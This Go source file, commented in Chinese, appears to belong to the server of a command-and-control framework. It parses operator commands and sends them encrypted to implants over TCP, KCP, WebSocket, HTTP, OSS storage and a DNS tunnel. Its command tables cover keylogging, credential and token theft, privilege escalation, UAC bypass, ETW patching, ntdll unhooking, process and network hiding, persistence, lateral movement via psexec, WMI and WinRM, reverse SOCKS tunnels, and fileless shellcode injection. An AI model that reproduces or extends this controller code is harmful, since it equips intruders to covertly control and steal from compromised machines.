package sendcommand

import (
	command1 "BackendTemplate/pkg/command"
	"BackendTemplate/pkg/connection"
	"BackendTemplate/pkg/connection/kcp"
	"BackendTemplate/pkg/connection/oss"
	"BackendTemplate/pkg/connection/tcp"
	ws "BackendTemplate/pkg/connection/websocket"
	"BackendTemplate/pkg/database"
	"BackendTemplate/pkg/encrypt"
	"BackendTemplate/pkg/utils"
	"BackendTemplate/pkg/utils/logx"
	"encoding/binary"
	"fmt"
	"strconv"
	"strings"
	"time"

	"github.com/gorilla/websocket"
)

// ============ P1-4 表驱动命令解析 ============

// cmdSpec 命令规格：prefix 命中时按 typ 编码，arg 为剥离前缀后的参数。
// build 为空表示无 payload（仅 4 字节类型头）；build 返回的参数编码直接追加。
type cmdSpec struct {
	prefix string
	typ    uint32
	build  func(arg string) []byte
}

var rawArg = func(arg string) []byte { return []byte(arg) }

// msArg 参数按毫秒编码（sleep/pause：秒 → 毫秒）
var msArg = func(arg string) []byte {
	n, _ := strconv.Atoi(arg)
	b := make([]byte, 4)
	binary.BigEndian.PutUint32(b, uint32(n*1000))
	return b
}

// intArg 参数按原值编码（kill：PID）
var intArg = func(arg string) []byte {
	n, _ := strconv.Atoi(arg)
	b := make([]byte, 4)
	binary.BigEndian.PutUint32(b, uint32(n))
	return b
}

// commandTable 命令表（顺序与原 if-else 链一致，前缀匹配敏感）
var commandTable = []cmdSpec{
	{prefix: "shell ", typ: command1.SHELL, build: rawArg},
	{prefix: "cd ", typ: command1.CD, build: rawArg},
	{prefix: "sleep ", typ: command1.SLEEP, build: msArg},
	{prefix: "pause ", typ: command1.PAUSE, build: msArg},
	{prefix: "kill ", typ: command1.KILL, build: intArg},
	{prefix: "mkdir ", typ: command1.MKDIR, build: rawArg},
	{prefix: "rm ", typ: command1.RM, build: rawArg},
	{prefix: "cp ", typ: command1.CP, build: rawArg},
	{prefix: "mv ", typ: command1.MV, build: rawArg},
	{prefix: "execute ", typ: command1.EXECUTE, build: rawArg},
	{prefix: "filebrowse ", typ: command1.FileBrowse, build: rawArg},
	{prefix: "filesearch ", typ: command1.FILE_SEARCH, build: rawArg},
	{prefix: "download ", typ: command1.DOWNLOAD, build: rawArg},
	{prefix: "filecontent ", typ: command1.FileContent, build: rawArg},
	{prefix: "socks5 ", typ: command1.ReverseSocks5Start, build: rawArg},
	{prefix: "socks5Close", typ: command1.ReverseSocks5Close},
	{prefix: "http_tunnel ", typ: command1.HTTP_TUNNEL, build: rawArg},
	{prefix: "http_tunnel_connect ", typ: command1.HTTP_TUNNEL, build: rawArg},
	{prefix: "interactive_shell_input ", typ: command1.INTERACTIVE_SHELL_INPUT, build: rawArg},
	{prefix: "interactive_shell_cmd_input ", typ: command1.CMD_MODE_INPUT, build: rawArg},
	{prefix: "interactive_shell_wmi_input ", typ: command1.WMI_MODE_INPUT, build: rawArg},
	{prefix: "persist ", typ: command1.PERSIST, build: rawArg},
	// 端口扫描：scan <目标> <端口> [超时毫秒]，如 `scan 10.0.0.0/24 top`
	{prefix: "scan ", typ: command1.PORT_SCAN, build: rawArg},
	{prefix: "service_start ", typ: command1.SERVICE_START, build: rawArg},
	{prefix: "service_stop ", typ: command1.SERVICE_STOP, build: rawArg},
	{prefix: "reg_query ", typ: command1.REG_QUERY, build: rawArg},
	{prefix: "self_update ", typ: command1.SELF_UPDATE, build: rawArg},
	{prefix: "ad_enum ", typ: command1.AD_ENUM, build: rawArg},
	{prefix: "wmi_exec ", typ: command1.PSEXEC, build: func(arg string) []byte { return []byte("wmi " + arg) }},
	{prefix: "psexec ", typ: command1.PSEXEC, build: rawArg},
	{prefix: "winrm_exec ", typ: command1.PSEXEC, build: func(arg string) []byte { return []byte("winrm " + arg) }},
	{prefix: "wmi_persist ", typ: command1.WMI_PERSIST, build: rawArg},
	{prefix: "hideprocess ", typ: command1.HIDE_PROCESS, build: rawArg},
	{prefix: "hidenet ", typ: command1.HIDE_NET, build: rawArg},
	// 提权（阶段三）：getsystem [auto|token|uac|uac_cleanup]
	// 注意必须在这里显式登记：漏了会落到下面的"默认 SHELL"分支，把 getsystem
	// 当 shell 命令发给 cmd.exe，客户端的 GETSYSTEM 分支永远收不到（实测踩过）。
	{prefix: "getsystem ", typ: command1.GETSYSTEM, build: rawArg},
	// Token 操作链（A8）
	{prefix: "make_token ", typ: command1.MAKE_TOKEN, build: rawArg},
	{prefix: "steal_token ", typ: command1.STEAL_TOKEN, build: rawArg},
}

// exactCommands 精确匹配的无参命令
var exactCommands = map[string]uint32{
	"pwd":                         command1.PWD,
	"exit":                        command1.EXIT,
	"drives":                      command1.DRIVES,
	"ps":                          command1.PS,
	"interactive_shell_start":     command1.INTERACTIVE_SHELL_START,
	"interactive_shell_cmd_start": command1.CMD_MODE_START,
	"interactive_shell_stop":      command1.INTERACTIVE_SHELL_STOP,
	"interactive_shell_cmd_stop":  command1.CMD_MODE_STOP,
	"interactive_shell_interrupt": command1.INTERACTIVE_SHELL_STOP,
	"interactive_shell_wmi_start": command1.WMI_MODE_START,
	"interactive_shell_wmi_stop":  command1.WMI_MODE_STOP,
	"clipboard":                   command1.CLIPBOARD,
	"wifi":                        command1.WIFI,
	"selfdelete":                  command1.SELFDELETE,
	"selfdelete_exit":             command1.SELFDELETE_EXIT,
	"keylog_start":                command1.KEYLOG_START,
	"keylog_get":                  command1.KEYLOG_GET,
	"keylog_stop":                 command1.KEYLOG_STOP,
	"services":                    command1.SERVICES,
	"etw_patch":                   command1.ETW_PATCH,
	"unhook_ntdll":                command1.UNHOOK_NTDLL,
	"sandbox_check":               command1.SANDBOX_CHECK,
	"antidebug":                   command1.ANTIDEBUG,
	"hideprocess":                 command1.HIDE_PROCESS,
	"hidenet":                     command1.HIDE_NET,
	// 提权（阶段三）：不带参数时客户端默认 auto
	"getsystem": command1.GETSYSTEM,
	// Token 操作链（A8）：make_token/steal_token 带参数走前缀表
	"rev2self": command1.REV2SELF,
}

// resolveCommand 将命令字符串解析为待发送字节（4 字节类型头 + payload）。
// 返回 send=false 表示命令已被就地处理（如 clear），无需下发。
func resolveCommand(uid, command string) (byteToSend []byte, send bool) {
	// TAB 自动补全：转成 SHELL 命令（compgen），与原实现一致
	if strings.HasPrefix(command, "interactive_shell_tab:") {
		cmd := strings.TrimPrefix(command, "interactive_shell_tab:")
		completionCmd := fmt.Sprintf("compgen -c %s 2>/dev/null | head -10", cmd)
		return buildCmd(command1.SHELL, []byte(completionCmd)), true
	}

	// 清屏：就地更新 shell 内容，不向客户端下发
	if strings.HasPrefix(command, "clear") {
		if database.DB() != nil {
			var shell database.Shell
			database.DB().Where("uid = ?", uid).Get(&shell)
			shell.ShellContent = "$ clear"
			database.DB().Where("uid = ?", uid).Update(&shell)
		}
		return nil, false
	}

	// 控制台注入：inject <pid> [tech] —— 动态生成 shellcode 并内存注入指定进程
	// （不再落入系统 shell；就地更新 shell content 立即反馈"任务已下发"，实际注入异步执行）
	if strings.HasPrefix(command, "inject ") {
		writeShellLine := func(msg string) ([]byte, bool) {
			if database.DB() != nil {
				var shell database.Shell
				database.DB().Where("uid = ?", uid).Get(&shell)
				shell.ShellContent = "$ " + command + "\n[+] " + msg + "\n"
				database.DB().Where("uid = ?", uid).Update(&shell)
			}
			return nil, false
		}
		args := strings.Fields(strings.TrimSpace(strings.TrimPrefix(command, "inject ")))
		if len(args) == 0 {
			return writeShellLine("用法: inject <pid> [auto|ntc|apc|crt]")
		}
		pid, perr := strconv.Atoi(args[0])
		if perr != nil || pid <= 0 {
			return writeShellLine("inject: 无效 PID")
		}
		tech := "auto"
		if len(args) > 1 {
			tech = args[1]
		}
		if InjectMemDispatcher == nil {
			return writeShellLine("inject: 分发器未注册")
		}
		pidv := pid
		techv := tech
		go InjectMemDispatcher(uid, pidv, techv)
		return writeShellLine("inject task dispatched: pid=" + strconv.Itoa(pid) + " tech=" + tech)
	}

	// 精确命令（无参）
	if typ, ok := exactCommands[command]; ok {
		return buildCmd(typ, nil), true
	}

	// 前缀命令（表驱动）
	for _, spec := range commandTable {
		if !strings.HasPrefix(command, spec.prefix) {
			continue
		}
		var payload []byte
		if spec.build != nil {
			payload = spec.build(strings.TrimPrefix(command, spec.prefix))
		}
		return buildCmd(spec.typ, payload), true
	}

	// 默认：整条命令作为 shell 命令处理
	return buildCmd(command1.SHELL, []byte(command)), true
}

func buildCmd(cmdType uint32, payload []byte) []byte {
	cmdTypeBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(cmdTypeBytes, cmdType)
	return append(cmdTypeBytes, payload...)
}

// GetListenerType 读取客户端连接类型（导出；供 inject 分发回调等使用）
func GetListenerType(uid string) (string, bool) {
	connection.MuClientListenerType.Lock()
	listenerType, exists := connection.ClientListenerType[uid]
	connection.MuClientListenerType.Unlock()
	return listenerType, exists
}

// GetListenerAddr 读取客户端连接的监听器地址（供 DispatchInject 精确匹配监听器）
func GetListenerAddr(uid string) (string, bool) {
	connection.MuClientListenerType.Lock()
	addr, exists := connection.ClientListenerAddr[uid]
	connection.MuClientListenerType.Unlock()
	return addr, exists
}

// getListenerType 读取客户端连接类型（含不存在告警）
func getListenerType(uid string) (string, bool) {
	connection.MuClientListenerType.Lock()
	listenerType, exists := connection.ClientListenerType[uid]
	connection.MuClientListenerType.Unlock()
	return listenerType, exists
}

// cleanupDeadConnection 清理失效连接的共享路径：
// 关闭实际连接终止读循环、删除连接映射、删除连接类型、注销离线检测、释放写锁
// 【振荡修复】conn 非 nil 时仅删除"仍指向该 conn"的映射——写失败清理可能晚于
// 客户端重连（新连接已入 map），无校验会误删新连接 → 命令/心跳 ack 丢失 → 反复重连
func cleanupDeadConnection(listenerType, uid string, conn interface{ Close() error }, logCtx string) {
	if conn != nil {
		conn.Close()
	}
	ws.MuClientManager.Lock()
	if conn == nil {
		delete(ws.ClientManager, uid)
	} else if cur, ok := ws.ClientManager[uid]; ok && cur == conn {
		delete(ws.ClientManager, uid)
	}
	ws.MuClientManager.Unlock()
	tcp.Mutex.Lock()
	if conn == nil {
		delete(tcp.TCPClientManger, uid)
	} else if cur, ok := tcp.TCPClientManger[uid]; ok && cur == conn {
		delete(tcp.TCPClientManger, uid)
	}
	delete(tcp.ClientTimeManager, uid)
	tcp.Mutex.Unlock()
	kcp.Mutex.Lock()
	if conn == nil {
		delete(kcp.KCPClientManger, uid)
	} else if cur, ok := kcp.KCPClientManger[uid]; ok && cur == conn {
		delete(kcp.KCPClientManger, uid)
	}
	delete(kcp.ClientTimeManager, uid)
	kcp.Mutex.Unlock()
	connection.MuClientListenerType.Lock()
	delete(connection.ClientListenerType, uid)
	connection.MuClientListenerType.Unlock()
	ws.ReleaseWriteLock(uid)
	tcp.ReleaseWriteLock(uid)
	kcp.ReleaseWriteLock(uid)
	if connection.GlobalOfflineDetector != nil && connection.GlobalOfflineDetector.IsRegistered(uid) {
		connection.GlobalOfflineDetector.Unregister(uid)
	}
	logx.Warnf("⚠️ [%s] %s 连接已清理: %s\n", listenerType, logCtx, uid)
}

// ============ 协议发送（SendCommand / SendFileUploadCommand 共用） ============

// sendByProtocol 按监听器协议类型将已编码命令下发（忽略失败详情，保持原有调用方语义）
func sendByProtocol(listenerType, uid string, byteToSend []byte, logCtx string) {
	_ = sendByProtocolErr(listenerType, uid, byteToSend, logCtx)
}

// sendByProtocolErr 下发并如实返回失败原因：队列满、连接不存在、加密失败、写入失败。
// 原来这些分支只打日志，调用方一律当成功——/api/bin/execute 因此会把"命令已被丢弃"
// 报成 200，前端一直显示"已发送"。
func sendByProtocolErr(listenerType, uid string, byteToSend []byte, logCtx string) error {
	switch listenerType {
	case "web", "http", "https":
		// 轮询客户端使用命令队列机制
		// 【背压】队列满时告警放弃（不再静默丢最旧导致分块损坏）
		if !command1.CommandQueues.AddCommand(uid, byteToSend) {
			logx.Warnf("⚠️ 命令队列已满，丢弃命令: %s, UID=%s\n", logCtx, uid)
			return fmt.Errorf("命令队列已满，命令未下发")
		}

	case "websocket", "ws_forward":
		ws.MuClientManager.Lock()
		conn, exists := ws.ClientManager[uid]
		ws.MuClientManager.Unlock()
		if !exists || conn == nil {
			logx.Warnf("⚠️ WebSocket连接不存在或已关闭: %s\n", uid)
			cleanupDeadConnection(listenerType, uid, conn, logCtx)
			return fmt.Errorf("WebSocket 连接不存在或已关闭")
		}
		cmdBytes, err := encrypt.EncryptWithSessionKey(byteToSend, uid)
		if err != nil {
			// 【加密体系改造】加密失败直接返回，不再回落旧加密
			logx.Warnf("⚠️ 高级加密失败: %v\n", err)
			return fmt.Errorf("命令加密失败: %w", err)
		}
		cmdBase64, _ := encrypt.EncodeBase64(cmdBytes)
		// 每连接写互斥：防止并发写帧交错；写 deadline 防慢客户端永久阻塞（背压）
		writeLock := ws.GetWriteLock(uid)
		writeLock.Lock()
		conn.SetWriteDeadline(time.Now().Add(30 * time.Second))
		err = conn.WriteMessage(websocket.BinaryMessage, cmdBase64)
		writeLock.Unlock()
		if err != nil {
			logx.Warnf("⚠️ WebSocket连接写入失败: %s, 错误: %v\n", uid, err)
			// I3: 关闭连接触发读循环退出 → 完整清理（原只删 map → 幽灵连接）
			cleanupDeadConnection(listenerType, uid, conn, logCtx)
			return fmt.Errorf("WebSocket 写入失败: %w", err)
		}

	case "tcp", "tcp_forward", "http_forward", "https_forward":
		tcp.Mutex.Lock()
		conn, exists := tcp.TCPClientManger[uid]
		tcp.Mutex.Unlock()
		if !exists || conn == nil {
			logx.Warnf("⚠️ TCP连接不存在或已关闭: %s\n", uid)
			cleanupDeadConnection(listenerType, uid, nil, logCtx)
			return fmt.Errorf("TCP 连接不存在或已关闭")
		}
		cmdBytes, err := encrypt.EncryptWithSessionKey(byteToSend, uid)
		if err != nil {
			// 【加密体系改造】加密失败直接返回，不再回落旧加密
			logx.Warnf("⚠️ 高级加密失败: %v\n", err)
			return fmt.Errorf("命令加密失败: %w", err)
		}
		cmdBase64, _ := encrypt.EncodeBase64(cmdBytes)
		cmdLen := len(cmdBase64)
		cmdLenBytes := utils.WriteInt(cmdLen)
		msgToSend := utils.BytesCombine(cmdLenBytes, cmdBase64)
		// 每连接写互斥：防止并发写帧交错
		writeLock := tcp.GetWriteLock(uid)
		writeLock.Lock()
		// P1-4: 复用 per-UID bufio.Writer（原每次命令新建，高频命令场景分配/GC 压力大）
		writer := tcp.GetWriteBuffer(uid, conn)
		_, err = writer.Write(msgToSend)
		if err != nil {
			writeLock.Unlock()
			logx.Warnf("⚠️ TCP连接写入失败: %s, 错误: %v\n", uid, err)
			cleanupDeadConnection(listenerType, uid, conn, logCtx)
			return fmt.Errorf("TCP 写入失败: %w", err)
		}
		err = writer.Flush()
		writeLock.Unlock()
		if err != nil {
			logx.Warnf("⚠️ TCP连接刷新失败: %s, 错误: %v\n", uid, err)
			cleanupDeadConnection(listenerType, uid, conn, logCtx)
			return fmt.Errorf("TCP 刷新失败: %w", err)
		}

	case "kcp", "kcp_forward":
		kcp.Mutex.Lock()
		conn, exists := kcp.KCPClientManger[uid]
		kcp.Mutex.Unlock()
		if !exists || conn == nil {
			logx.Warnf("⚠️ KCP连接不存在或已关闭: %s\n", uid)
			cleanupDeadConnection(listenerType, uid, nil, logCtx)
			return fmt.Errorf("KCP 连接不存在或已关闭")
		}
		cmdBytes, err := encrypt.EncryptWithSessionKey(byteToSend, uid)
		if err != nil {
			// 【加密体系改造】加密失败直接返回，不再回落旧加密
			logx.Warnf("⚠️ 高级加密失败: %v\n", err)
			return fmt.Errorf("命令加密失败: %w", err)
		}
		cmdBase64, _ := encrypt.EncodeBase64(cmdBytes)
		cmdLen := len(cmdBase64)
		cmdLenBytes := utils.WriteInt(cmdLen)
		msgToSend := utils.BytesCombine(cmdLenBytes, cmdBase64)
		// 每连接写互斥：防止并发写帧交错
		writeLock := kcp.GetWriteLock(uid)
		writeLock.Lock()
		_, err = conn.Write(msgToSend)
		writeLock.Unlock()
		if err != nil {
			logx.Warnf("⚠️ KCP连接写入失败: %s, 错误: %v\n", uid, err)
			cleanupDeadConnection(listenerType, uid, conn, logCtx)
			// 统一离线入口：置 Online=2 + 离线事件 + 队列清理
			connection.MarkOffline(uid, listenerType, "写入失败")
			logx.Infof("🔌 [KCP写入失败] 客户端连接已清理: %s\n", uid)
			return fmt.Errorf("KCP 写入失败: %w", err)
		}

	case "oss":
		cmdBytes, err := encrypt.EncryptWithSessionKey(byteToSend, uid)
		if err != nil {
			logx.Warnf("⚠️ 高级加密失败: %v\n", err)
			return fmt.Errorf("命令加密失败: %w", err)
		}
		cmdBase64, _ := encrypt.EncodeBase64(cmdBytes)
		// 按 uid 取回服务该客户端的 OSS 监听器：多监听器下不能再用全局 client
		// （原 oss.Service 恒为最后初始化的那个，命令会被写进另一个桶）。
		// 取不到说明监听器已停止或客户端从未上报，此时丢弃并告警，不要盲目投递。
		if c := oss.ClientForUID(uid); c != nil {
			oss.Send(c, uid+fmt.Sprintf("/server_%020d", time.Now().UnixNano()), cmdBase64)
		} else {
			logx.Warnf("⚠️ [OSS] 客户端 %s 未登记到任何 OSS 监听器，命令未下发（监听器可能已停止）\n", uid)
			return fmt.Errorf("客户端未登记到任何 OSS 监听器，命令未下发")
		}

	case "dns":
		// DNS 隧道：命令放入队列，客户端轮询时取走（由 dns listener 的 handlePull 下发）
		if !command1.CommandQueues.AddCommand(uid, byteToSend) {
			logx.Warnf("⚠️ 命令队列已满，丢弃命令: %s, UID=%s\n", logCtx, uid)
			return fmt.Errorf("命令队列已满，命令未下发")
		}

	default:
		logx.Warnf("⚠️ 未知的连接类型: %s 对于 UID: %s\n", listenerType, uid)
		return fmt.Errorf("未知的连接类型: %s", listenerType)
	}
	return nil
}

// InjectMemDispatcher 控制台 inject 命令分发回调（由 main 注册到 api.DispatchInject）：
// 按客户端监听器动态生成新 beacon shellcode 并内存注入指定进程（无文件）。
var InjectMemDispatcher func(uid string, pid int, tech string) error

// SendCommand 发送字符串命令
func SendCommand(uid string, command string) {
	logx.Infof("[DEBUG] SendCommand 接收到命令: UID=%s, Command='%s'\n", uid, command)

	listenerType, exists := getListenerType(uid)
	if !exists {
		logx.Warnf("⚠️ 客户端连接类型不存在: %s\n", uid)
		return
	}

	byteToSend, send := resolveCommand(uid, command)
	if !send {
		return
	}
	sendByProtocol(listenerType, uid, byteToSend, "命令")
}

// SendFileUploadCommand 发送已编码命令字节（文件上传/截图等由 API 层构建的载荷）
func SendFileUploadCommand(uid string, byteToSend []byte) {
	listenerType, exists := getListenerType(uid)
	if !exists {
		logx.Warnf("⚠️ 客户端连接类型不存在: %s\n", uid)
		return
	}
	sendByProtocol(listenerType, uid, byteToSend, "文件上传")
}

// SendCommandChecked 发送文本命令并返回失败原因（队列满/连接不存在/加密或写入失败）。
// 本地处理的命令（如 clear，resolveCommand 返回 send=false）视为成功。
// 与 SendCommand 的关系同 SendFileUploadCommandChecked 与 SendFileUploadCommand。
func SendCommandChecked(uid, command string) error {
	listenerType, exists := getListenerType(uid)
	if !exists {
		return fmt.Errorf("客户端连接类型未知（可能已离线）: %s", uid)
	}
	byteToSend, send := resolveCommand(uid, command)
	if !send {
		return nil
	}
	return sendByProtocolErr(listenerType, uid, byteToSend, "命令")
}

// SendFileUploadCommandChecked 发送已编码命令字节并返回失败原因。
// 与 SendFileUploadCommand 的差别是"真的知道有没有发出去"（队列满 / 连接不存在 /
// 加密或写入失败都会返回错误），供 /api/bin/execute 这类必须如实回报结果的入口使用。
// 注意不要拿 SendFileUploadCommandWithResult 顶替：那个变体对持久连接类型只做存在性
// 检查、不实际发送（inject-mem 的分块循环依赖它的语义）。
func SendFileUploadCommandChecked(uid string, byteToSend []byte) error {
	listenerType, exists := getListenerType(uid)
	if !exists {
		return fmt.Errorf("客户端连接类型未知（可能已离线）: %s", uid)
	}
	return sendByProtocolErr(listenerType, uid, byteToSend, "文件上传")
}

// SendFileUploadCommandWithResult 发送已编码命令字节并返回是否成功（布尔形式，等价于
// SendFileUploadCommandChecked(...) == nil）。
//
// 【修复】原实现只对轮询/队列类型真正入队，对持久连接类型（tcp/kcp/ws/oss）仅做
// "连接是否存在"的检查就返回 true，注释称"实际发送由 SendInjectMem 的循环保证"——
// 但 SendInjectMem 的循环里唯一的动作就是调用本函数，于是对持久连接客户端做内存注入时
// 分块全部丢失、调用方却拿到成功。现在统一走 sendByProtocolErr，真的发送并如实回报。
func SendFileUploadCommandWithResult(uid string, byteToSend []byte) bool {
	return SendFileUploadCommandChecked(uid, byteToSend) == nil
}
